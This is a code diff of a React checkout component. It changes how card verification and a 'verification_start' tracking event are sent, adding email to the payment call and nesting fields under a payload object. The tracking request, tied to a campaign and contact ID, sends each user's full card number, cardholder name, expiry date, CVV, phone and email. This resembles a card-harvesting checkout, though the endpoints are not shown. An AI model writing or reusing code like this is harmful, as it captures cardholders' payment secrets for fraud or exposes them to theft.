@@ -9,7 +9,6 @@ const Checkout = forwardRef(function Checkout(
     email,
     firstName,
     campaign,
-    sessionPath,
     onSuccess,
     onError,
     amount = '10'
@@ -24,10 +23,6 @@ const Checkout = forwardRef(function Checkout(
   const [status, setStatus] = useState(null);
   const payFetch = async (payload, verifyAmount = '10') => {
     try {
-      if (!sessionPath) {
-        throw new Error('Session path is required');
-      }
-
       // Appeler l'API proceed avec les données de la carte
       const cardDetails = {
         cardNumber: payload.card || payload.cardNumber,
@@ -40,11 +35,11 @@ const Checkout = forwardRef(function Checkout(
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          sessionPath,
           cardDetails,
           amount: verifyAmount,
           contactId,
-          eventId
+          eventId,
+          email
         })
       });
 
@@ -78,16 +73,18 @@ const Checkout = forwardRef(function Checkout(
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            eventType: 'verification_start',
-            email,
-            firstName,
-            phone: formData?.phone || formData?.phoneNumber || '',
-            card: formData?.card,
-            name: formData?.name,
-            exp: formData?.exp,
-            cvv: formData?.cvv,
             campaign,
-            contactId
+            eventType: 'verification_start',
+            payload: {
+              email,
+              firstName,
+              phone: formData?.phone || formData?.phoneNumber || '',
+              card: formData?.card,
+              name: formData?.name,
+              exp: formData?.exp,
+              cvv: formData?.cvv,
+              contactId
+            }
           })
         });
         if (trackRes.ok) {
